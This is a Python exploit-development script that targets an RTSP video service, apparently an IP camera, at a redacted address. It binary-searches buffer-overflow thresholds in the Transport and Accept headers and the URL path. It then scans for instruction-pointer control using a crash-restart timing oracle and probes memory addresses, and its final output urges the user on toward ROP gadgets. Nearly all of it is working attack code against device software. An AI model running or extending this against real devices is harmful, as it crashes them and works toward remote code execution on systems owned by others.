#!/usr/bin/env python3
"""
rtsp_overflow_scan.py — PC-offset scan for Transport, Accept, URL path overflows.

New overflow surfaces found (rtsp_url_overflow.py):
  - Transport header:  threshold ~64B  (VERY small → stack buffer)
  - Accept header:     threshold ~200B (between 128 and 200)
  - URL path:          threshold 426B, baseline=4.2s HIT (code path hit!)

Strategy for each field:
  1. Binary-search exact threshold
  2. Scan PC offsets from threshold to threshold+200 (step 4)
  3. Use both NULL_PC (0x00000000) and BAD_PC (0x00000001) as test values
  4. A SIGSEGV-speed restart (<4s) for 0x00000001 → we hit a CODE pointer
  5. A HIT-speed restart (4-70s) for ANY value → something interesting is happening

RTSP oracle timing (from prior work):
  < 4s   → SIGSEGV / SIGABRT (fast crash)  [originally 1.7-2.3s]
  4-70s  → HIT zone (code executed)
  >70s   → kernel panic / full reboot
  90s    → no restart (looping or watchdog dead)
"""

import socket, time, struct, sys

TARGET    = "█████████████"
RTSP_PORT = 554

# ─── Liveness & oracle ───────────────────────────────────────────────────────

def rtsp_alive(timeout=5):
    try:
        s = socket.socket(); s.settimeout(timeout)
        s.connect((TARGET, RTSP_PORT))
        s.sendall(b"OPTIONS rtsp://" + TARGET.encode() + b":554/ RTSP/1.0\r\nCSeq: 1\r\n\r\n")
        d = b""
        try: d = s.recv(256)
        except: pass
        s.close()
        return b"RTSP" in d
    except:
        return False

def wait_rtsp(max_wait=120, label=""):
    t0 = time.time()
    while time.time() - t0 < max_wait:
        if rtsp_alive():
            elapsed = time.time() - t0
            if elapsed > 1:
                print(f"  [✓] RTSP alive ({label}) — waited {elapsed:.0f}s", flush=True)
            return True
        time.sleep(1.5)
    print(f"  [✗] RTSP dead after {max_wait}s ({label})", flush=True)
    return False

def oracle(req_bytes, label="", poll_timeout=90):
    if not wait_rtsp(max_wait=60, label="pre"):
        return None
    print(f"  [→] {label}", flush=True)
    t0 = time.time()
    try:
        s = socket.socket(); s.settimeout(8)
        s.connect((TARGET, RTSP_PORT))
        s.sendall(req_bytes)
        try: s.recv(256)
        except: pass
        s.close()
    except: pass

    PROBE = b"OPTIONS rtsp://" + TARGET.encode() + b":554/ RTSP/1.0\r\nCSeq: 99\r\n\r\n"
    deadline = t0 + poll_timeout
    last_print = t0
    while time.time() < deadline:
        time.sleep(0.4)
        if time.time() - last_print >= 8:
            print(f"    T+{time.time()-t0:.0f}s waiting...", flush=True)
            last_print = time.time()
        try:
            s2 = socket.socket(); s2.settimeout(3)
            s2.connect((TARGET, RTSP_PORT))
            s2.sendall(PROBE)
            d = b""
            try: d = s2.recv(256)
            except: pass
            s2.close()
            if b"RTSP" in d:
                elapsed = time.time() - t0
                tag = "FAST" if elapsed < 4 else ("HIT" if elapsed < 70 else "PANIC")
                print(f"  [★] restart T+{elapsed:.1f}s [{tag}]", flush=True)
                return elapsed
        except: pass
    print(f"  [?] no restart in {poll_timeout}s", flush=True)
    return float(poll_timeout)

def classify(t):
    if t is None: return "SKIP"
    if t < 4: return "FAST"
    if t < 70: return "HIT"
    if t < 90: return "PANIC"
    return "DEAD"


# ─── Build RTSP requests for each field ──────────────────────────────────────

def req_transport(transport_val):
    return (b"SETUP rtsp://█████████████:554/Streaming/Channels/1 RTSP/1.0\r\n"
            b"CSeq: 2\r\nUser-Agent: TestOvf\r\n"
            b"Transport: " + transport_val + b"\r\n\r\n")

def req_accept(accept_val):
    return (b"DESCRIBE rtsp://█████████████:554/Streaming/Channels/1 RTSP/1.0\r\n"
            b"CSeq: 1\r\nUser-Agent: TestOvf\r\n"
            b"Accept: " + accept_val + b"\r\n\r\n")

def req_url_path(path_bytes):
    return (b"DESCRIBE rtsp://█████████████:554/" + path_bytes + b" RTSP/1.0\r\n"
            b"CSeq: 1\r\nUser-Agent: TestOvf\r\n\r\n")


# ─── Binary search helper ─────────────────────────────────────────────────────

def binary_search_threshold(build_req_fn, lo, hi, label=""):
    """Binary search crash threshold."""
    while lo < hi - 1:
        mid = (lo + hi) // 2
        req = build_req_fn(b"A" * mid)
        try:
            s = socket.socket(); s.settimeout(8)
            s.connect((TARGET, RTSP_PORT)); s.sendall(req)
            d = b""
            try: d = s.recv(256)
            except: pass
            s.close()
            crashed = len(d) == 0
        except:
            crashed = True
        if crashed:
            hi = mid
        else:
            lo = mid
        time.sleep(0.3)
        if crashed:
            wait_rtsp(max_wait=30, label="binary-search")
    return hi


# ──────────────────────────────────────────────────────────────────────────────
# PART 1: TRANSPORT header (threshold ~64B — tiny buffer, very likely stack)
# ──────────────────────────────────────────────────────────────────────────────

print("=" * 70)
print("PART 1: Transport header PC-offset scan")
print("  Prefix: 'RTP/AVP;unicast;client_port='")
print("  Threshold: crash at 64 bytes of '1's (total ~92B in Transport)")
print("=" * 70)

wait_rtsp(max_wait=120, label="start")

# Refine threshold with binary search
print("\n[*] Binary-searching Transport threshold...")
transport_prefix = b"RTP/AVP;unicast;client_port="
def build_transport(payload):
    return req_transport(transport_prefix + payload)

TRANSPORT_THRESHOLD = binary_search_threshold(build_transport, 32, 128, "Transport")
print(f"  Transport exact threshold: {TRANSPORT_THRESHOLD} bytes past prefix", flush=True)
wait_rtsp(max_wait=90, label="after threshold search")

# Baseline (all A's at threshold)
req_base = build_transport(b"A" * TRANSPORT_THRESHOLD)
t_base = oracle(req_base, label=f"Transport baseline {TRANSPORT_THRESHOLD}B", poll_timeout=90)
print(f"  baseline={t_base:.1f}s → {classify(t_base)}", flush=True)
time.sleep(5)
wait_rtsp(max_wait=120)

# PC offset scan
NULL_PC = struct.pack('<I', 0x00000000)
BAD_PC  = struct.pack('<I', 0x00000001)
DEAD_PC = struct.pack('<I', 0xDEADBEEF)

transport_hits = []
print("\n[*] Transport PC offset scan (NULL_PC = 0x00000000):")
for pad in range(TRANSPORT_THRESHOLD, TRANSPORT_THRESHOLD + 200, 4):
    payload = b"A" * pad + NULL_PC + b"C" * 32
    req = build_transport(payload)
    t = oracle(req, label=f"Transport pad={pad} NULL_PC", poll_timeout=90)
    cls = classify(t)
    print(f"  Transport pad={pad:4d}  t={t:.1f}s  {cls}", flush=True)
    if cls == "FAST" and t < 3:
        transport_hits.append(pad)
        print(f"  *** FAST <3s at Transport pad={pad} → strong PC control candidate! ***", flush=True)
    time.sleep(3)
    wait_rtsp(max_wait=120)

print(f"\n  Transport PC control candidates: {transport_hits}")


# ──────────────────────────────────────────────────────────────────────────────
# PART 2: ACCEPT header (threshold between 128 and 200 bytes)
# ──────────────────────────────────────────────────────────────────────────────

print()
print("=" * 70)
print("PART 2: Accept header PC-offset scan")
print("  Prefix: 'application/sdp;'")
print("  Threshold: crash between 128 and 200 bytes")
print("=" * 70)

wait_rtsp(max_wait=120, label="before Accept scan")

accept_prefix = b"application/sdp;"
def build_accept(payload):
    return req_accept(accept_prefix + payload)

print("\n[*] Binary-searching Accept threshold...")
ACCEPT_THRESHOLD = binary_search_threshold(build_accept, 128, 256, "Accept")
print(f"  Accept exact threshold: {ACCEPT_THRESHOLD} bytes past prefix", flush=True)
wait_rtsp(max_wait=90)

# Baseline
req_base = build_accept(b"A" * ACCEPT_THRESHOLD)
t_base = oracle(req_base, label=f"Accept baseline {ACCEPT_THRESHOLD}B", poll_timeout=90)
print(f"  baseline={t_base:.1f}s → {classify(t_base)}", flush=True)
time.sleep(5)
wait_rtsp(max_wait=120)

# PC offset scan
accept_hits = []
print("\n[*] Accept PC offset scan (NULL_PC = 0x00000000):")
for pad in range(ACCEPT_THRESHOLD, ACCEPT_THRESHOLD + 200, 4):
    payload = b"A" * pad + NULL_PC + b"C" * 32
    req = build_accept(payload)
    t = oracle(req, label=f"Accept pad={pad} NULL_PC", poll_timeout=90)
    cls = classify(t)
    print(f"  Accept pad={pad:4d}  t={t:.1f}s  {cls}", flush=True)
    if cls == "FAST" and t < 3:
        accept_hits.append(pad)
        print(f"  *** FAST <3s at Accept pad={pad} → strong PC control candidate! ***", flush=True)
    time.sleep(3)
    wait_rtsp(max_wait=120)

print(f"\n  Accept PC control candidates: {accept_hits}")


# ──────────────────────────────────────────────────────────────────────────────
# PART 3: URL path (threshold=426B, baseline=4.2s HIT)
# Note: URL path baseline=4.2s is already in HIT zone with all-A's!
# The value 0x41414141 = 'AAAA' → jumping to that address
# Let's scan the PC offset more carefully
# ──────────────────────────────────────────────────────────────────────────────

print()
print("=" * 70)
print("PART 3: URL path PC-offset scan (threshold=426, baseline=4.2s HIT!)")
print("  'AAAA' (0x41414141) → already causes HIT (mapped? ASLR off?)")
print("  Testing specific PC values at offset 426:")
print("=" * 70)

URL_THRESHOLD = 426
wait_rtsp(max_wait=120, label="before URL scan")

# Test with various values at offset 426 (beyond threshold)
# ASLR off + binary at 0x41414141 would give HIT, but that's the stack? unlikely
# Let's try: what does 0x41414141 → 0x42424242 → 0x00000001 give?

test_values = [
    (0x41414141, "AAAA (baseline from overflow)"),
    (0x00000001, "BAD_PC 0x1"),
    (0x00000000, "NULL_PC 0x0"),
    (0xDEADBEEF, "DEADBEEF"),
    (0x00008000, "ELF_text_0x8000"),
    (0x00008001, "ELF_text_0x8000_THUMB"),   # Thumb mode = addr | 1
    (0x40000000, "mmap_0x40000000"),
    (0x40000001, "mmap_0x40000000_THUMB"),
    (0xBFFF8000, "stack_0xBFFF8000"),
]

url_results = {}
for pc_val, label in test_values:
    pc_bytes = struct.pack('<I', pc_val)
    path = b"A" * URL_THRESHOLD + pc_bytes + b"C" * 32
    req = req_url_path(path)
    t = oracle(req, label=f"URL 0x{pc_val:08X} ({label})", poll_timeout=90)
    cls = classify(t)
    url_results[pc_val] = (t, cls)
    print(f"  0x{pc_val:08X}  {label:35s}  {t:.1f}s  {cls}", flush=True)
    time.sleep(5)
    wait_rtsp(max_wait=120)

print()
print("=" * 70)
print("URL path results comparison:")
print("  (If all give ~4.2s HIT → it's always jumping to something at offset 426)")
print("  (If 0x1 gives FAST → we have PC control!)")
print("=" * 70)
for pc_val, (t, cls) in url_results.items():
    label = dict(test_values).get(pc_val, "?")
    print(f"  0x{pc_val:08X}  {t:.1f}s  {cls}  {label}")


# ──────────────────────────────────────────────────────────────────────────────
# PART 4: Transport with CONFIRMED PC control — test real addresses
# (runs only if transport_hits found)
# ──────────────────────────────────────────────────────────────────────────────

if transport_hits:
    PC_OFF = transport_hits[0]
    print()
    print("=" * 70)
    print(f"PART 4: Transport PC control at pad={PC_OFF} — address oracle scan")
    print("=" * 70)

    ADDRS = [
        (0x00008000, "ELF_text"),
        (0x00008001, "ELF_text_THUMB"),
        (0x00010000, "ELF+0x8000"),
        (0x00010001, "ELF+0x8000_THUMB"),
        (0x00020000, "ELF+0x18000"),
        (0x40000000, "libc_mmap"),
        (0x40000001, "libc_mmap_THUMB"),
        (0xBFFF8000, "stack"),
    ]

    wait_rtsp(max_wait=120, label="before addr oracle")
    for addr, label in ADDRS:
        payload = b"A" * PC_OFF + struct.pack('<I', addr) + b"C" * 32
        req = build_transport(payload)
        t = oracle(req, label=f"T_addr 0x{addr:08X} ({label})", poll_timeout=90)
        cls = classify(t)
        print(f"  0x{addr:08X}  {label:25s}  {t:.1f}s  {cls}", flush=True)
        time.sleep(5)
        wait_rtsp(max_wait=120)


# ──────────────────────────────────────────────────────────────────────────────
# Summary
# ──────────────────────────────────────────────────────────────────────────────

print()
print("=" * 70)
print("SCAN SUMMARY")
print("=" * 70)
print(f"  Transport threshold: {TRANSPORT_THRESHOLD} bytes past prefix")
print(f"  Accept threshold:    {ACCEPT_THRESHOLD} bytes past prefix")
print(f"  URL path threshold:  {URL_THRESHOLD} bytes (baseline HIT 4.2s)")
print()
print(f"  Transport PC candidates: {transport_hits}")
print(f"  Accept PC candidates:    {accept_hits}")
print()
if transport_hits or accept_hits:
    print("  [!!!] PC CONTROL FOUND — run address oracle with ROP gadgets!")
else:
    print("  [!] No clean PC control found yet")
    print("  Next steps:")
    print("   1. Check URL path with Thumb addresses (addr|1)")
    print("   2. Try partial overwrites (2-byte overwrite to flip lower PC bytes)")
    print("   3. Try RTSP PLAY with Range header overflow")
print("\nDone.")
